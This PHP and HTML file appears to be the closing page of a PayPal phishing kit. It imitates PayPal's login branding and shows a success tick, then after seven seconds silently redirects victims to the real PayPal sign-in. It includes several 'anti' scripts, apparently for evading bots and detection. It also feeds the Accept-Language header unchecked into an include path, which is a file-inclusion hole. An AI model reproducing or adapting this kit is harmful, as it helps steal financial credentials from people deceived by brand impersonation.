<?php
session_start();
include "config/conf.php";
include "anti/anti1.php";
include "anti/anti2.php";
include "anti/anti3.php";
include "anti/anti4.php";
include "anti/anti5.php";
include "anti/anti6.php";
include "anti/anti7.php";
error_reporting(0);

include("X_911.php");

$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
include "lang/{$lang }.php";

?><!DOCTYPE html>

<html lang="en"


<head>
<meta charset="utf-8" />
<title>thanx</title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8" />
<meta name="application-name" content="PayPal" />
<meta http-equiv="refresh" content="7;URL='https://paypal.com/signin'" />
<link rel="shortcut icon" href="./img/pp_favicon_x.ico" />
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=2, user-scalable=yes" />
<link rel="stylesheet" href="contextualLoginElementalUI.css">
</head>
</div>
</section>
<section id="login" class="login " data-role="page" data-title="Log in to your PayPal account">
<div class=" corral">
<div id="content" class="contentContainer activeContent contentContainerBordered">
<header>
<p role="img" aria-label="PayPal Logo" class="paypal-logo paypal-logo-long signin-paypal-logo"></p>
</header>


<center>
<h1><?php echo $lg_cm['lto5']?></h1><br>
<!-- <div aria-label="Tarjeta de muestra" class="cardForm-cardArt">
<div aria-hidden="true" class="cardImage-container cardImage-container_medium"><img width="150" class="cardImage_medium" src="./img/svg/success.svg" alt=""/></div>
</div>-->



<style>

@supports (animation: grow .5s cubic-bezier(.25, .25, .25, 1) forwards) {
.tick {
stroke-opacity: 0;
stroke-dasharray: 29px;
stroke-dashoffset: 29px;
animation: draw .5s cubic-bezier(.25, .25, .25, 1) forwards;
animation-delay: .6s
}

.circle {
fill-opacity: 0;
stroke: #219a00;
stroke-width: 16px;
transform-origin: center;
transform: scale(0);
animation: grow 1s cubic-bezier(.25, .25, .25, 1.25) forwards;
}
}

@keyframes grow {
60% {
transform: scale(.8);
stroke-width: 4px;
fill-opacity: 0;
}
100% {
transform: scale(.9);
stroke-width: 8px;
fill-opacity: 1;
fill: #219a00;
}
}

@keyframes draw {
0%, 100% { stroke-opacity: 1; }
100% { stroke-dashoffset: 0; }
}








// Styles
:root {
--theme-color: var(--color-purple);
}

</style>
<script>
let path = document.querySelector(".tick");
let length = path.getTotalLength();

console.log(length);
</script>
<div class="svg-container">
<svg class="ft-green-tick" xmlns="http://www.w3.org/2000/svg" height="100" width="100" viewBox="0 0 48 48" aria-hidden="true">
<circle class="circle" fill="#5bb543" cx="24" cy="24" r="22"/>
<path class="tick" fill="none" stroke="#FFF" stroke-width="6" stroke-linecap="round" stroke-linejoin="round" stroke-miterlimit="10" d="M14 27l5.917 4.917L34 17"/>
</svg>
</div>

<br>

<p class="textstyle" ><?php echo $lg_cm['lto1']?>
</p>








</center>
<footer class="footer footerStayPut" role="contentinfo">
<div class="legalFooter"><ul class="footerGroup">
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top6']?></a>
</li>
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top7']?></a>
</li>
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top8']?></a>
</li>
<li>
<a target="_blank" href="#" pa-marked="1"><?php echo $lg_cm['top9']?></a>
</li>
</ul>
</div>
</footer>
</div>
<div class="transitioning hide ">
<p class="welcomeMessage hide">Welcome, !</p>
<p class="checkingInfo hide">Checking your info…</p>
<p class="oneSecond hide">Just a second…</p>
<p class="secureMessage hide">Securely logging you in...</p>
<p class="oneTouchMessage hide"></p>
<p class="retrieveInfo hide">Retrieving your info...</p>
<p class="waitFewSecs hide">This may take a few seconds...</p>
<p class="udtSpinnerMessage udtLogin hide">We recognize you on this device, and we’re securely logging you in.</p>
<p class="udtSpinnerMessage udtLoginXo hide">We recognize you on this device, so no need to enter your password for this purchase.</p>
<p class="udtSpinnerMessage webllsXoUS hide">
We recognize you on this device, so you can skip login.<br>
<br>Manage this setting in your profile.
</p>
<p class="udtSpinnerMessage webllsSCA hide">We're taking you to PayPal Checkout to complete payment.</p>
<p class="qrcMessage hide">Redirecting...</p>
<div class="keychain spinner-content uiExp hide"></div>
</div>
</body>

</html>